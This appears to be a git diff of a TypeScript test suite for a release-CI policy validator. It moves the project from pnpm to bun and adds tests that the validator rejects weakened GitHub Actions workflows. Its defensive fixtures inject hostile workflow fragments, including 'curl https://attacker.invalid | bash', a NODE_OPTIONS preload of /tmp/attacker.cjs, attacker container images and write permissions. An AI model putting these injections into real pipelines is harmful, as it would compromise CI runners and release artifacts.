@@ -4,7 +4,7 @@ import { validateReleaseCiPolicy } from '../release-ci-policy'
 
 const ACTION_CHECKOUT = 'actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6'
 const ACTION_SETUP_NODE = 'actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6'
-const PNPM_ACTION_SETUP = 'pnpm/action-setup@b906affcce14559ad1aafd4ab0e942779e9f58b1 # v4'
+const ACTION_SETUP_BUN = 'oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2'
 
 const dispatchIdentityGuard = `      - name: Verify dispatched commit identity
         if: github.event_name == 'workflow_dispatch'
@@ -23,6 +23,52 @@ describe('release CI policy', () => {
     expect(validateReleaseCiPolicy(compliantWorkflow)).toEqual([])
   })
 
+  it('requires a dispatched candidate merge base rather than the moving main tip', () => {
+    const weakened = compliantWorkflow.replace(
+      'COMMIT_POLICY_FROM="$(git merge-base "$COMMIT_POLICY_TO" refs/remotes/origin/main)"',
+      'COMMIT_POLICY_FROM=refs/remotes/origin/main',
+    )
+    expect(validateReleaseCiPolicy(weakened)).toContain(
+      'CI workflow must match its exact fail-closed AST contract.',
+    )
+  })
+
+  it('rejects removal of the real zsh dependency from the Linux test job', () => {
+    const installCommand = '            if sudo apt-get install --yes zsh; then break; fi\n'
+    const positions = [
+      ...compliantWorkflow.matchAll(/ {12}if sudo apt-get install --yes zsh; then break; fi\n/gu),
+    ]
+    expect(positions).toHaveLength(1)
+    for (const match of positions) {
+      const index = match.index
+      const withoutShell =
+        compliantWorkflow.slice(0, index) + compliantWorkflow.slice(index + installCommand.length)
+      expect(validateReleaseCiPolicy(withoutShell)).not.toEqual([])
+    }
+  })
+
+  it('rejects an NSIS install that no longer proves makensis is present', () => {
+    const probe = '          makensis -VERSION\n'
+    expect(compliantWorkflow.split(probe)).toHaveLength(2)
+    expect(validateReleaseCiPolicy(compliantWorkflow.replace(probe, ''))).not.toEqual([])
+  })
+
+  it('rejects a Linux test job that stops fetching the Electron binary up front', () => {
+    const electronInput = "        with:\n          electron-binary: 'true'\n"
+    expect(compliantWorkflow.split(electronInput)).toHaveLength(4)
+    expect(validateReleaseCiPolicy(compliantWorkflow.replace(electronInput, ''))).not.toEqual([])
+  })
+
+  it.each([
+    '            sudo chown root -- "$insecure_path"\n',
+    '            sudo chmod go-w -- "$insecure_path"\n',
+    "          /bin/zsh -f -c 'autoload -Uz compaudit; compaudit'\n",
+  ])('requires secure completion directories and a successful final audit: %s', (command) => {
+    expect(compliantWorkflow.split(command)).toHaveLength(2)
+    expect(validateReleaseCiPolicy(compliantWorkflow.replace(command, ''))).not.toEqual([])
+    expect(validateReleaseCiPolicy(compliantWorkflow.replaceAll(command, ''))).not.toEqual([])
+  })
+
   it('rejects a workflow that skips release commits or omits dispatched-ref checkout', () => {
     const violations = validateReleaseCiPolicy(
       compliantWorkflow
@@ -30,7 +76,10 @@ describe('release CI policy', () => {
           "ref: ${{ github.event_name == 'workflow_dispatch' && inputs.head_sha || github.sha }}\n",
           '',
         )
-        .replace('name: Typecheck & Lint', "if: \"!startsWith(github.event.head_commit.message, 'chore(release):')\"\n    name: Typecheck & Lint"),
+        .replace(
+          'name: Typecheck & Lint',
+          'if: "!startsWith(github.event.head_commit.message, \'chore(release):\')"\n    name: Typecheck & Lint',
+        ),
     )
 
     expect(violations).toEqual(
@@ -53,27 +102,55 @@ describe('release CI policy', () => {
     const weakenedWorkflow = compliantWorkflow
       .replace('permissions:\n  contents: read\n', '')
       .replaceAll(ACTION_CHECKOUT, 'actions/checkout@v6')
-      .replaceAll(PNPM_ACTION_SETUP, 'pnpm/action-setup@v4')
+      .replaceAll(ACTION_SETUP_BUN, 'oven-sh/setup-bun@v2')
       .replaceAll(ACTION_SETUP_NODE, 'actions/setup-node@v6')
 
     expect(validateReleaseCiPolicy(weakenedWorkflow)).toEqual(
       expect.arrayContaining([
         'CI must grant only read access to repository contents.',
         `CI must use ${ACTION_CHECKOUT} in every required job.`,
-        `CI must use ${PNPM_ACTION_SETUP} in every required job.`,
+        `CI must use ${ACTION_SETUP_BUN} in every required job.`,
         `CI must use ${ACTION_SETUP_NODE} in every required job.`,
       ]),
     )
   })
 
   it.each([
-    ['workflow environment', 'env:\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true', 'env:\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true\n  NODE_OPTIONS: --require /tmp/attacker.cjs'],
-    ['unexpected job', 'jobs:\n', 'jobs:\n  attacker:\n    name: Attacker\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.invalid | bash\n'],
-    ['rehearsal command', '        run: pnpm package:smoke', '        run: pnpm package:smoke\n      - run: curl https://attacker.invalid | bash'],
-    ['job container', '  package-release-rehearsal:\n    name:', '  package-release-rehearsal:\n    container: attacker/image:latest\n    name:'],
-    ['job service', '  package-release-rehearsal:\n    name:', '  package-release-rehearsal:\n    services:\n      attacker:\n        image: attacker/image:latest\n    name:'],
-    ['step shell', '        run: pnpm package:smoke', '        shell: attacker-shell\n        run: pnpm package:smoke'],
-    ['job permission', '  package-release-rehearsal:\n    name:', '  package-release-rehearsal:\n    permissions:\n      contents: write\n    name:'],
+    [
+      'workflow environment',
+      'env:\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true',
+      'env:\n  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true\n  NODE_OPTIONS: --require /tmp/attacker.cjs',
+    ],
+    [
+      'unexpected job',
+      'jobs:\n',
+      'jobs:\n  attacker:\n    name: Attacker\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.invalid | bash\n',
+    ],
+    [
+      'rehearsal command',
+      '        run: bun run package:smoke',
+      '        run: bun run package:smoke\n      - run: curl https://attacker.invalid | bash',
+    ],
+    [
+      'job container',
+      '  package-release-rehearsal-package:\n    name:',
+      '  package-release-rehearsal-package:\n    container: attacker/image:latest\n    name:',
+    ],
+    [
+      'job service',
+      '  package-release-rehearsal-package:\n    name:',
+      '  package-release-rehearsal-package:\n    services:\n      attacker:\n        image: attacker/image:latest\n    name:',
+    ],
+    [
+      'step shell',
+      '        run: bun run package:smoke',
+      '        shell: attacker-shell\n        run: bun run package:smoke',
+    ],
+    [
+      'job permission',
+      '  package-release-rehearsal-package:\n    name:',
+      '  package-release-rehearsal-package:\n    permissions:\n      contents: write\n    name:',
+    ],
   ])('rejects exact-contract drift through %s', (_name, target, replacement) => {
     expect(validateReleaseCiPolicy(compliantWorkflow.replace(target, replacement))).toContain(
       'CI workflow must match its exact fail-closed AST contract.',
@@ -125,12 +202,15 @@ describe('release CI policy', () => {
   })
 
   it.each([
-    ['unnamed', `${compliantWorkflow}
+    [
+      'unnamed',
+      `${compliantWorkflow}
   unnamed-job:
     runs-on: ubuntu-latest
     steps:
       - run: echo bypass
-`],
+`,
+    ],
     [
       'quoted',
       compliantWorkflow.replace(
@@ -140,7 +220,7 @@ describe('release CI policy', () => {
     ],
   ])('rejects %s jobs outside the stable job set', (_kind, workflow) => {
     expect(validateReleaseCiPolicy(workflow)).toContain(
-      'CI must expose exactly these stable job names: Commit Policy, Typecheck & Lint, Unit & Component Tests, Package release rehearsal (Node ${{ matrix.node }}), Prepare immutable package release artifacts, Package Release Gate.',
+      'CI must expose exactly these stable job names: Commit Policy, Typecheck & Lint, Unit Tests, Integration & Component Tests, MCP Conformance, Session Performance, Detect Changed Surfaces, Package Consumer Rehearsal (Node 22.19.0), Website & Docs Rehearsal (Node 24.14.0), Classify Package Release Candidate, Build and attest package artifacts (Release Please PR only), Package Release Candidate, Package Release Gate.',
     )
   })
 
@@ -151,14 +231,17 @@ describe('release CI policy', () => {
     )
 
     expect(validateReleaseCiPolicy(branchRacyWorkflow)).toContain(
-      'CI concurrency must isolate workflow_dispatch runs by inputs.head_sha and cancel stale duplicate work.',
+      'CI concurrency must isolate workflow_dispatch runs by inputs.head_sha, cancel stale duplicate work, and never cancel merge-queue validation.',
     )
   })
 
   it('rejects action setup moved out of one required job into another', () => {
     const redistributedActionsWorkflow = compliantWorkflow
       .replace(ACTION_CHECKOUT, 'actions/checkout@v6')
-      .replace('      - run: pnpm test', `      - uses: ${ACTION_CHECKOUT}\n      - run: pnpm test`)
+      .replace(
+        '      - run: bun run test:unit',
+        `      - uses: ${ACTION_CHECKOUT}\n      - run: bun run test`,
+      )
 
     expect(validateReleaseCiPolicy(redistributedActionsWorkflow)).toContain(
       `CI job Commit Policy must use ${ACTION_CHECKOUT} exactly once.`,
@@ -168,7 +251,10 @@ describe('release CI policy', () => {
   it('rejects a dispatch identity guard moved out of one required job into another', () => {
     const redistributedGuardWorkflow = compliantWorkflow
       .replace(dispatchIdentityGuard, '')
-      .replace('      - run: pnpm test', `${dispatchIdentityGuard}      - run: pnpm test`)
+      .replace(
+        '      - run: bun run test:unit',
+        `${dispatchIdentityGuard}      - run: bun run test`,
+      )
 
     expect(validateReleaseCiPolicy(redistributedGuardWorkflow)).toContain(
       'CI job Commit Policy must independently guard and check out inputs.head_sha.',
@@ -177,30 +263,39 @@ describe('release CI policy', () => {
 
   it('rejects a required command moved into a differently named job', () => {
     const redistributedCommandWorkflow = compliantWorkflow
-      .replace('      - run: pnpm check', '      - run: echo skipped')
-      .replace('      - run: pnpm test', '      - run: pnpm check\n      - run: pnpm test')
+      .replace('      - run: bun scripts/check/output-budget.ts check', '      - run: echo skipped')
+      .replace(
+        '      - run: bun run test:unit',
+        '      - run: bun scripts/check/output-budget.ts check\n      - run: bun run test',
+      )
 
     expect(validateReleaseCiPolicy(redistributedCommandWorkflow)).toContain(
-      'CI job Typecheck & Lint must run pnpm check as an exact, fail-closed step.',
+      'CI job Typecheck & Lint must run bun scripts/check/output-budget.ts check as an exact, fail-closed step.',
     )
   })
 
   it.each([
-    ['shell fallback', '      - run: pnpm check || true'],
-    ['comment-only match', '      # run: pnpm check'],
-    ['continued execution', '      - run: |\n          pnpm check\n          echo ignored'],
+    ['shell fallback', '      - run: bun scripts/check/output-budget.ts check || true'],
+    ['comment-only match', '      # run: bun scripts/check/output-budget.ts check'],
+    [
+      'continued execution',
+      '      - run: |\n          bun scripts/check/output-budget.ts check\n          echo ignored',
+    ],
   ])('rejects %s instead of the exact required command', (_name, replacement) => {
-    const weakenedWorkflow = compliantWorkflow.replace('      - run: pnpm check', replacement)
+    const weakenedWorkflow = compliantWorkflow.replace(
+      '      - run: bun scripts/check/output-budget.ts check',
+      replacement,
+    )
 
     expect(validateReleaseCiPolicy(weakenedWorkflow)).toContain(
-      'CI job Typecheck & Lint must run pnpm check as an exact, fail-closed step.',
+      'CI job Typecheck & Lint must run bun scripts/check/output-budget.ts check as an exact, fail-closed step.',
     )
   })
 
   it('rejects continue-on-error on a required step', () => {
     const weakenedWorkflow = compliantWorkflow.replace(
-      '      - run: pnpm test',
-      '      - run: pnpm test\n        continue-on-error: true',
+      '      - run: bun run test:unit',
+      '      - run: bun run test:unit\n        continue-on-error: true',
     )
 
     expect(validateReleaseCiPolicy(weakenedWorkflow)).toContain(
@@ -223,14 +318,14 @@ describe('release CI policy', () => {
     const weakenedWorkflow = compliantWorkflow
       .replace('  pull_request:\n    branches: [main]', '  # pull_request:\n    # branches: [main]')
       .replace(
-        '  group: ci-${{ github.workflow }}-${{ github.event.pull_request.number || inputs.head_sha || github.ref }}',
-        '  # group: ci-${{ github.workflow }}-${{ github.event.pull_request.number || inputs.head_sha || github.ref }}',
+        '  group: ci-${{ github.event_name }}-${{ github.event.pull_request.number || inputs.head_sha || github.ref }}',
+        '  # group: ci-${{ github.event_name }}-${{ github.event.pull_request.number || inputs.head_sha || github.ref }}',
       )
 
     expect(validateReleaseCiPolicy(weakenedWorkflow)).toEqual(
       expect.arrayContaining([
         'CI must run on pull requests targeting main.',
-        'CI concurrency must isolate workflow_dispatch runs by inputs.head_sha and cancel stale duplicate work.',
+        'CI concurrency must isolate workflow_dispatch runs by inputs.head_sha, cancel stale duplicate work, and never cancel merge-queue validation.',
       ]),
     )
   })
